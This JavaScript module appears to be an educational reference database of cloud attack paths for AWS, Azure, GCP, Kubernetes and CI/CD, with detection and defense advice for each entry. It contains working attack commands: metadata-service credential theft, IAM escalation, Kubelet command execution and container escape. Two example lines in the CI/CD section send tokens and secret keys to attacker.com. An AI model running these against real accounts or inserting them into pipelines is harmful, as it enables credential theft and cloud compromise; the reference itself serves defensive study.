// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// Cloud Attack Techniques Reference Database
// AWS, Azure, GCP attack paths and exploitation techniques.

export const CLOUD_ATTACK_PATHS = {
  aws: {
    provider: "Amazon Web Services",
    initialAccess: [
      {
        id: "AWS-INIT-001",
        name: "SSRF to IMDS (Instance Metadata Service)",
        mitre: "T1552.005",
        severity: "critical",
        description: "Exploiting Server-Side Request Forgery to access the EC2 Instance Metadata Service at 169.254.169.254, retrieving IAM role credentials.",
        attackPath: [
          "Identify SSRF vulnerability in web application (URL parameter, webhook, PDF generator, image proxy)",
          "Request http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "Retrieve IAM role name from the response",
          "Request http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
          "Extract AccessKeyId, SecretAccessKey, and Token",
          "Configure AWS CLI: aws configure with stolen credentials",
          "Enumerate permissions: aws iam list-attached-role-policies --role-name ROLE_NAME"
        ],
        detection: [
          "CloudTrail logs showing API calls from unexpected IPs with role credentials",
          "GuardDuty finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
          "VPC Flow Logs showing outbound connections from EC2 to unusual destinations after IMDS access"
        ],
        defense: [
          "Enable IMDSv2 (requires PUT request with token — blocks simple SSRF): aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required",
          "Restrict IAM role permissions to minimum required (least privilege)",
          "Set IMDS hop limit to 1: --http-put-response-hop-limit 1 (blocks container SSRF)",
          "Use VPC endpoints instead of public endpoints where possible",
          "WAF rules to detect SSRF patterns (169.254.169.254 in request parameters)"
        ],
        realWorldExamples: [
          "Capital One breach (2019) — SSRF on WAF to IMDS, exfiltrated 100M+ credit applications",
          "Multiple bug bounty reports on companies using vulnerable PDF generators and image proxies"
        ]
      },
      {
        id: "AWS-INIT-002",
        name: "Exposed S3 Bucket",
        mitre: "T1530",
        severity: "critical",
        description: "Accessing publicly readable or writable S3 buckets containing sensitive data, source code, backups, or credentials.",
        attackPath: [
          "Enumerate bucket names: company-name, company-backup, company-dev, company-logs, company-assets",
          "Check bucket access: aws s3 ls s3://bucket-name --no-sign-request",
          "Download contents: aws s3 sync s3://bucket-name ./loot --no-sign-request",
          "Check for writable access: aws s3 cp test.txt s3://bucket-name/ --no-sign-request",
          "If writable: upload web shell, modify hosted assets (supply chain), or pivot"
        ],
        tools: [
          { name: "bucket_finder", command: "ruby bucket_finder.rb wordlist.txt", description: "Brute-force S3 bucket names" },
          { name: "S3Scanner", command: "python3 s3scanner.py --buckets-file names.txt", description: "Scan for open S3 buckets" },
          { name: "AWSBucketDump", command: "python AWSBucketDump.py -l bucket-names.txt", description: "Enumerate and download S3 bucket contents" },
          { name: "grayhatwarfare", command: "Search https://buckets.grayhatwarfare.com", description: "Public S3 bucket search engine" }
        ],
        defense: [
          "S3 Block Public Access (account-level): aws s3control put-public-access-block --account-id ACCOUNT --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true",
          "Bucket policies with explicit deny for public access",
          "AWS Config rule: s3-bucket-public-read-prohibited, s3-bucket-public-write-prohibited",
          "Enable S3 access logging and CloudTrail data events",
          "Encrypt data at rest with SSE-S3, SSE-KMS, or SSE-C"
        ]
      },
      {
        id: "AWS-INIT-003",
        name: "Leaked AWS Access Keys",
        mitre: "T1552.001",
        severity: "critical",
        description: "Finding AWS access keys in public repositories, client-side code, environment files, or error messages.",
        sources: [
          "GitHub/GitLab public repositories (committed .env, config files, hardcoded in source)",
          "Client-side JavaScript bundles (NEXT_PUBLIC_ variables, webpack bundles)",
          "Docker images (ENV in Dockerfile, committed .aws/credentials)",
          "CI/CD logs (debug mode printing environment variables)",
          "Error pages (Django/Flask debug, Spring Boot Actuator /env)",
          "Pastebin / public code snippet sites",
          "APK/IPA mobile app decompilation"
        ],
        detection: [
          "AWS Security Hub finding for exposed keys",
          "TruffleHog: trufflehog git https://github.com/org/repo",
          "git-secrets: git secrets --scan-history",
          "AWS Health API notifications (AWS detects keys on GitHub)"
        ],
        defense: [
          "Use IAM roles instead of long-term access keys",
          "Enable git-secrets pre-commit hook to block key commits",
          "AWS Secrets Manager or SSM Parameter Store for secrets",
          "Rotate keys regularly: aws iam create-access-key / delete-access-key",
          "SCP (Service Control Policy) to restrict key creation",
          "Enable key auto-rotation with AWS Secrets Manager"
        ]
      }
    ],
    privilegeEscalation: [
      {
        id: "AWS-PRIVESC-001",
        name: "IAM Policy Escalation",
        description: "Exploiting overly permissive IAM policies to escalate privileges. At least 21 known privilege escalation paths exist in AWS IAM.",
        paths: [
          { path: "iam:CreatePolicyVersion", description: "Create a new policy version with full admin permissions and set it as default", command: "aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/target --policy-document file://admin-policy.json --set-as-default" },
          { path: "iam:SetDefaultPolicyVersion", description: "Change the default version of a managed policy to one with more permissions", command: "aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/target --version-id v2" },
          { path: "iam:AttachUserPolicy", description: "Attach AdministratorAccess policy to your user", command: "aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" },
          { path: "iam:AttachRolePolicy", description: "Attach admin policy to a role you can assume", command: "aws iam attach-role-policy --role-name target-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess" },
          { path: "iam:PutUserPolicy", description: "Put an inline policy with full permissions on your user", command: "aws iam put-user-policy --user-name attacker --policy-name escalate --policy-document file://admin-policy.json" },
          { path: "iam:CreateLoginProfile", description: "Create console login for a user without one (to access more privileged user)", command: "aws iam create-login-profile --user-name admin-user --password NewP@ss123!" },
          { path: "iam:UpdateLoginProfile", description: "Reset another user's console password", command: "aws iam update-login-profile --user-name admin-user --password NewP@ss123!" },
          { path: "iam:CreateAccessKey", description: "Create access keys for a more privileged user", command: "aws iam create-access-key --user-name admin-user" },
          { path: "iam:PassRole + ec2:RunInstances", description: "Launch EC2 with an admin role attached, then access IMDS for role credentials", command: "aws ec2 run-instances --iam-instance-profile Name=admin-role ..." },
          { path: "iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction", description: "Create Lambda function with admin role, invoke to execute privileged code", command: "aws lambda create-function --role arn:aws:iam::ACCOUNT:role/admin-role --function-name escalate --handler index.handler --runtime python3.9 --code file://escalate.zip" },
          { path: "sts:AssumeRole", description: "Assume a more privileged role if trust policy allows it", command: "aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/admin --role-session-name escalation" },
          { path: "iam:PassRole + glue:CreateDevEndpoint", description: "Create Glue dev endpoint with admin role SSH access", command: "aws glue create-dev-endpoint --role-arn arn:aws:iam::ACCOUNT:role/admin --endpoint-name escalate --public-key file://key.pub" }
        ],
        tools: [
          { name: "Pacu", command: "Pacu > run iam__privesc_scan", description: "AWS exploitation framework with privilege escalation scanner" },
          { name: "cloudsplaining", command: "cloudsplaining scan --input-file account_auth_details.json", description: "Identifies IAM privilege escalation and resource exposure risks" },
          { name: "PMapper", command: "pmapper graph create; pmapper query 'who can do iam:* with *'", description: "Graph-based AWS IAM privilege escalation analysis" }
        ],
        defense: [
          "Least privilege IAM policies — never use wildcards (* in actions/resources) unless absolutely necessary",
          "SCP guardrails preventing dangerous IAM actions",
          "AWS Access Analyzer to identify overly permissive policies",
          "Regular IAM credential reports and unused permission cleanup",
          "Enable CloudTrail for all IAM API calls"
        ]
      },
      {
        id: "AWS-PRIVESC-002",
        name: "Lambda Function Code Injection",
        description: "Modifying existing Lambda function code or environment variables to execute arbitrary code with the function's IAM role.",
        attackPath: [
          "Enumerate Lambda functions: aws lambda list-functions",
          "Get function details: aws lambda get-function --function-name target",
          "Modify function code: aws lambda update-function-code --function-name target --zip-file file://backdoor.zip",
          "Or inject via environment variables: aws lambda update-function-configuration --function-name target --environment 'Variables={LD_PRELOAD=/tmp/backdoor.so}'",
          "Trigger function execution to run with its IAM role"
        ],
        defense: [
          "Restrict lambda:UpdateFunctionCode and lambda:UpdateFunctionConfiguration permissions",
          "Code signing for Lambda deployment packages",
          "Monitor CloudTrail for Lambda function modifications",
          "Use Lambda Layers with integrity verification"
        ]
      }
    ],
    persistence: [
      {
        id: "AWS-PERSIST-001",
        name: "Backdoor IAM User/Role",
        description: "Creating a new IAM user, access key, or modifying trust policies to maintain access.",
        techniques: [
          "Create new IAM user with admin policy: aws iam create-user --user-name backup-admin",
          "Create access keys for existing user: aws iam create-access-key --user-name existing-user",
          "Modify role trust policy to allow attacker's AWS account: aws iam update-assume-role-policy",
          "Add attacker's account as Lambda permission: aws lambda add-permission",
          "Create new SSM document for persistent access: aws ssm create-document"
        ],
        defense: [
          "Monitor CloudTrail for CreateUser, CreateAccessKey, UpdateAssumeRolePolicy events",
          "AWS Config rules for unauthorized IAM changes",
          "Regular IAM user and role audits",
          "Require MFA for sensitive IAM operations"
        ]
      },
      {
        id: "AWS-PERSIST-002",
        name: "EC2 Instance Backdoor",
        description: "Modifying EC2 instances or launch configurations to maintain persistent access.",
        techniques: [
          "Add SSH key to authorized_keys via SSM Run Command",
          "Create AMI from compromised instance for future use",
          "Modify user data script to establish reverse shell on boot",
          "Add security group rule allowing attacker's IP on SSH/RDP",
          "Create snapshot of volume and share with attacker's AWS account"
        ]
      }
    ]
  },
  azure: {
    provider: "Microsoft Azure",
    initialAccess: [
      {
        id: "AZURE-INIT-001",
        name: "Azure IMDS Exploitation",
        severity: "critical",
        description: "Similar to AWS — SSRF to Azure Instance Metadata Service at 169.254.169.254 to steal managed identity tokens.",
        attackPath: [
          "SSRF to http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ (with Metadata:true header)",
          "Extract access_token from response",
          "Use token with Azure REST API or az CLI: az account get-access-token",
          "Enumerate accessible resources: az resource list"
        ],
        defense: [
          "Azure does not have IMDSv2 equivalent — SSRF prevention is the primary defense",
          "Use Managed Identity with minimal permissions",
          "Network Security Groups to restrict outbound traffic",
          "Application-level SSRF protections"
        ]
      },
      {
        id: "AZURE-INIT-002",
        name: "Exposed Azure Storage Blobs",
        severity: "high",
        description: "Accessing publicly readable Azure Blob Storage containers containing sensitive data.",
        tools: [
          { name: "MicroBurst", command: "Invoke-EnumerateAzureBlobs -Base companyprod", description: "Azure storage enumeration" },
          { name: "BlobHunter", command: "python BlobHunter.py", description: "Scan for exposed Azure blobs" }
        ],
        defense: [
          "Disable anonymous access to storage accounts",
          "Use Shared Access Signatures (SAS) with expiration for external access",
          "Enable storage account firewall rules",
          "Azure Policy to prevent public blob containers"
        ]
      },
      {
        id: "AZURE-INIT-003",
        name: "Azure AD Password Spray",
        severity: "high",
        description: "Brute-forcing Azure AD accounts using a single password against many usernames to avoid account lockout.",
        attackPath: [
          "Enumerate valid users via Azure AD login page response differences or Microsoft Graph API",
          "Use common passwords (Season+Year, Company+123, Welcome1) against all discovered users",
          "Each password tested against all users before moving to next (avoids lockout)",
          "Successful login → access to Azure portal, O365, SharePoint, Teams, email"
        ],
        tools: [
          { name: "MSOLSpray", command: "Invoke-MSOLSpray -UserList users.txt -Password 'Summer2024!'", description: "Azure AD password spraying" },
          { name: "Spray", command: "spray --aad -u users.txt -p passwords.txt -t 60", description: "Password spraying with timing control" },
          { name: "Ruler", command: "ruler --email user@target.com brute -p passwords.txt", description: "Exchange/O365 password spraying" }
        ],
        defense: [
          "Azure AD Smart Lockout (detects spray patterns)",
          "Conditional Access Policies (require MFA, block legacy auth, geo-restrictions)",
          "Disable legacy authentication protocols (IMAP, POP3, SMTP Auth)",
          "Azure AD Identity Protection risk-based policies",
          "Monitor sign-in logs for spray patterns"
        ]
      }
    ],
    privilegeEscalation: [
      {
        id: "AZURE-PRIVESC-001",
        name: "Azure AD Privilege Escalation",
        description: "Escalating from low-privilege Azure AD user to Global Administrator through various paths.",
        paths: [
          { path: "Application Administrator → Global Admin", description: "Application Administrator can add credentials to any application, including ones with admin consent. If an app has Directory.ReadWrite.All, adding a credential gives equivalent access." },
          { path: "Privileged Role Administrator", description: "Can assign any Azure AD role including Global Administrator to any user." },
          { path: "Automation Account Contributor", description: "Can create runbooks that execute as the automation account's managed identity, which often has subscription-level permissions." },
          { path: "User Access Administrator (Azure RBAC)", description: "Can assign any Azure RBAC role including Owner to any scope." },
          { path: "Key Vault access → credential theft", description: "If user has Key Vault access, they may retrieve secrets/certificates used by other principals." }
        ],
        tools: [
          { name: "AzureHound", command: "azurehound list --tenant TENANT_ID -o output.json", description: "BloodHound collector for Azure AD — maps attack paths" },
          { name: "ROADtools", command: "roadrecon gather; roadrecon gui", description: "Azure AD enumeration and visualization" },
          { name: "Stormspotter", command: "python stormspotter.py --app-id APP_ID --tenant TENANT", description: "Azure attack path visualization" }
        ]
      }
    ]
  },
  gcp: {
    provider: "Google Cloud Platform",
    initialAccess: [
      {
        id: "GCP-INIT-001",
        name: "GCP Metadata Server Exploitation",
        severity: "critical",
        description: "SSRF to GCP metadata server to steal service account tokens and project metadata.",
        attackPath: [
          "SSRF to http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (requires Metadata-Flavor: Google header)",
          "GCP metadata server requires Metadata-Flavor: Google header — but SSRF via URL redirect can bypass this",
          "Alternative endpoint: http://169.254.169.254/computeMetadata/v1/...",
          "Extract access token and use with gcloud CLI or REST API"
        ],
        defense: [
          "GCP's header requirement provides some SSRF protection (vs AWS IMDSv1)",
          "Use VPC Service Controls to restrict API access",
          "Workload Identity for GKE instead of node-level service accounts",
          "Minimize service account permissions"
        ]
      },
      {
        id: "GCP-INIT-002",
        name: "Exposed GCS Buckets",
        severity: "high",
        description: "Accessing publicly readable Google Cloud Storage buckets.",
        tools: [
          { name: "gcpbucketbrute", command: "python3 gcpbucketbrute.py -k KEYWORD -o results.txt", description: "GCS bucket enumeration and permission checking" }
        ],
        defense: [
          "Organization policy constraint: constraints/storage.uniformBucketLevelAccess",
          "Org policy: constraints/storage.publicAccessPrevention",
          "Enable uniform bucket-level access (no per-object ACLs)",
          "VPC Service Controls for sensitive buckets"
        ]
      }
    ],
    privilegeEscalation: [
      {
        id: "GCP-PRIVESC-001",
        name: "Service Account Key Creation",
        description: "If a user has iam.serviceAccountKeys.create permission on a privileged service account, they can create a key and authenticate as that service account.",
        command: "gcloud iam service-accounts keys create key.json --iam-account admin-sa@project.iam.gserviceaccount.com",
        defense: "Org policy: constraints/iam.disableServiceAccountKeyCreation. Monitor for CreateServiceAccountKey events in Cloud Audit Logs."
      },
      {
        id: "GCP-PRIVESC-002",
        name: "Service Account Impersonation",
        description: "Using iam.serviceAccounts.getAccessToken or iam.serviceAccounts.implicitDelegation to generate tokens for a more privileged service account.",
        command: "gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com",
        defense: "Restrict iam.serviceAccounts.getAccessToken and actAs permissions. Use IAM Conditions to limit impersonation scope."
      },
      {
        id: "GCP-PRIVESC-003",
        name: "Cloud Function Code Injection",
        description: "Deploying or modifying a Cloud Function that runs with a privileged service account.",
        command: "gcloud functions deploy backdoor --runtime python39 --trigger-http --service-account admin-sa@project.iam.gserviceaccount.com --source ./malicious_code/",
        defense: "Restrict cloudfunctions.functions.create/update permissions. Org policy for allowed function runtimes. Code signing."
      }
    ]
  },
  kubernetes: {
    platform: "Kubernetes",
    attacks: [
      {
        id: "K8S-001",
        name: "Exposed Kubernetes API Server",
        severity: "critical",
        description: "Kubernetes API server accessible from the internet, often with anonymous authentication enabled or without proper RBAC.",
        detection: "curl -k https://TARGET:6443/api/v1/namespaces/default/pods",
        impact: "Full cluster compromise — read secrets, deploy pods, access nodes",
        defense: "Restrict API server access via firewall/NSG. Disable anonymous auth. Use RBAC with least privilege. Enable audit logging."
      },
      {
        id: "K8S-002",
        name: "Container Escape via Privileged Pod",
        severity: "critical",
        description: "Exploiting a pod running with privileged: true or with hostPID/hostNetwork/hostIPC to escape to the host node.",
        techniques: [
          "Mount host filesystem: mount /dev/sda1 /mnt — read/write host files including /etc/shadow, kubelet credentials",
          "nsenter to host namespace: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
          "Access kubelet credentials at /var/lib/kubelet/ — impersonate node",
          "Deploy DaemonSet to compromise all nodes in the cluster"
        ],
        defense: [
          "Pod Security Standards (PSS) — enforce 'restricted' profile",
          "OPA Gatekeeper / Kyverno to block privileged pods",
          "Seccomp profiles to restrict syscalls",
          "AppArmor/SELinux for container runtime security",
          "Read-only root filesystem where possible"
        ]
      },
      {
        id: "K8S-003",
        name: "Kubernetes Secret Extraction",
        severity: "high",
        description: "Accessing Kubernetes Secrets which are only base64-encoded (not encrypted) by default.",
        command: "kubectl get secrets -A -o json | jq '.items[].data | to_entries[] | .value' -r | base64 -d",
        impact: "Database credentials, API keys, TLS certificates, Docker registry credentials",
        defense: [
          "Enable encryption at rest: EncryptionConfiguration in kube-apiserver",
          "Use external secret managers (HashiCorp Vault, AWS Secrets Manager) with CSI driver",
          "RBAC: restrict Secret access to specific service accounts",
          "Audit logging for Secret access"
        ]
      },
      {
        id: "K8S-004",
        name: "Kubelet API Exploitation",
        severity: "critical",
        description: "Accessing the Kubelet API (port 10250) directly to execute commands in containers, list pods, and access logs.",
        attackPath: [
          "List pods: curl -k https://NODE:10250/pods",
          "Execute command: curl -k -X POST https://NODE:10250/run/NAMESPACE/POD/CONTAINER -d 'cmd=id'",
          "Get container logs: curl -k https://NODE:10250/containerLogs/NAMESPACE/POD/CONTAINER"
        ],
        defense: [
          "Enable Kubelet authentication: --anonymous-auth=false",
          "Enable Kubelet authorization: --authorization-mode=Webhook",
          "Restrict Kubelet port access via network policy/firewall",
          "TLS certificates for Kubelet communication"
        ]
      },
      {
        id: "K8S-005",
        name: "Service Account Token Theft",
        severity: "high",
        description: "Every pod gets a service account token mounted at /var/run/secrets/kubernetes.io/serviceaccount/token. If the service account has excessive permissions, this token enables cluster attacks.",
        attackPath: [
          "Read token: cat /var/run/secrets/kubernetes.io/serviceaccount/token",
          "Check permissions: kubectl auth can-i --list --token=$TOKEN",
          "Enumerate cluster: kubectl get pods,services,deployments -A --token=$TOKEN",
          "If create pods permission: deploy privileged pod for node escape"
        ],
        defense: [
          "Disable service account token automounting: automountServiceAccountToken: false",
          "Use bound service account tokens (token projection volumes) with TTL",
          "Minimal RBAC for default service accounts",
          "Network policies to restrict pod-to-API-server communication"
        ]
      }
    ]
  },
  cicd: {
    platform: "CI/CD Pipelines",
    attacks: [
      {
        id: "CICD-001",
        name: "Poisoned Pipeline Execution (PPE)",
        severity: "critical",
        description: "Injecting malicious code into CI/CD pipeline configuration files (Jenkinsfile, .github/workflows, .gitlab-ci.yml) to execute arbitrary code with pipeline permissions.",
        types: [
          { type: "Direct PPE (D-PPE)", description: "Modify pipeline config in a branch/PR — pipeline runs the modified config with full CI credentials", example: "Add `curl http://attacker.com/steal?token=$GITHUB_TOKEN` to .github/workflows/ci.yml in a PR" },
          { type: "Indirect PPE (I-PPE)", description: "Modify a file that the pipeline consumes (Makefile, test script, requirements.txt) without changing the pipeline config itself", example: "Add `os.system('curl http://attacker.com/steal?token=' + os.environ['AWS_SECRET_KEY'])` to a test file" },
          { type: "Public PPE", description: "Fork a public repo and submit a PR — if the target repo runs CI on PR events from forks, the malicious code executes with the target's CI secrets", example: "Fork repo, modify workflow, submit PR — CI runs with target's secrets" }
        ],
        defense: [
          "Require approval for CI runs on PRs from forks",
          "Use OIDC for cloud auth instead of storing secrets in CI",
          "Pin GitHub Actions to commit SHA instead of branch/tag",
          "Review pipeline configuration changes as security-sensitive",
          "Minimal CI token permissions (GITHUB_TOKEN permissions)"
        ]
      },
      {
        id: "CICD-002",
        name: "Dependency Confusion / Substitution",
        severity: "critical",
        description: "Publishing a malicious package to a public registry with the same name as an internal package, exploiting package manager resolution order.",
        mechanism: "Many package managers (npm, pip, Maven) check public registries first. If a company uses an internal package called 'company-auth', publishing 'company-auth' on npm/PyPI with a higher version number makes the build system download the malicious public version.",
        realWorldExamples: [
          "Alex Birsan's 2021 research — compromised Apple, Microsoft, PayPal, Tesla, Uber via dependency confusion",
          "Over 35 companies found vulnerable in initial disclosure"
        ],
        defense: [
          "Use scoped packages (@company/package-name) in npm",
          "Configure package managers to use internal registry only for internal packages",
          "pip: --index-url for internal, --extra-index-url for public",
          "Register internal package names on public registries as placeholders",
          "Lock file integrity (package-lock.json, Pipfile.lock) with hash verification"
        ]
      },
      {
        id: "CICD-003",
        name: "Compromised GitHub Action / GitLab Runner",
        severity: "critical",
        description: "Using a third-party GitHub Action that gets compromised to steal secrets from all repositories using it.",
        realWorldExamples: [
          "tj-actions/changed-files (March 2025) — compromised action injected secret-exfiltration code, affecting 23,000+ repositories",
          "codecov/codecov-action (2021) — compromised to steal CI secrets and credentials from pipelines"
        ],
        defense: [
          "Pin Actions to full commit SHA: uses: org/action@abc123 (not @v1)",
          "Audit third-party Actions before use",
          "Minimal GITHUB_TOKEN permissions",
          "Monitor Action version changes",
          "Fork and self-host critical Actions"
        ]
      }
    ]
  }
};

export const CLOUD_ENUMERATION_TOOLS = [
  { name: "ScoutSuite", command: "scout --provider aws", description: "Multi-cloud security auditing tool (AWS, Azure, GCP)" },
  { name: "Prowler", command: "prowler aws", description: "AWS security assessment against CIS benchmarks and best practices" },
  { name: "Pacu", command: "Pacu > import_keys; run iam__enum_permissions", description: "AWS exploitation framework (like Metasploit for AWS)" },
  { name: "CloudMapper", command: "python cloudmapper.py collect --account ACCOUNT_ID; python cloudmapper.py prepare; python cloudmapper.py webserver", description: "AWS network visualization and security auditing" },
  { name: "Cartography", command: "cartography --neo4j-uri bolt://localhost:7687 --neo4j-password-env-var NEO4J_PASSWORD", description: "Graph-based infrastructure analysis" },
  { name: "CloudBrute", command: "CloudBrute -d target.com -k wordlist.txt -m storage", description: "Cloud infrastructure enumeration (storage, apps, databases)" },
  { name: "AzureHound", command: "azurehound list --tenant TENANT_ID -o output.json", description: "Azure AD attack path mapping (BloodHound-compatible)" },
  { name: "ROADtools", command: "roadrecon gather; roadrecon gui", description: "Azure AD reconnaissance and enumeration" },
  { name: "MicroBurst", command: "Import-Module MicroBurst.psm1; Invoke-EnumerateAzureBlobs -Base company", description: "Azure penetration testing toolkit" },
  { name: "GCPBucketBrute", command: "python3 gcpbucketbrute.py -k company -o results.txt", description: "GCP bucket enumeration and permission checking" },
  { name: "CloudFox", command: "cloudfox aws all-checks", description: "Automated cloud penetration testing tool (AWS, Azure, GCP)" },
  { name: "Steampipe", command: "steampipe check aws_compliance.benchmark.cis_v150", description: "Query cloud resources with SQL (multi-cloud)" }
];
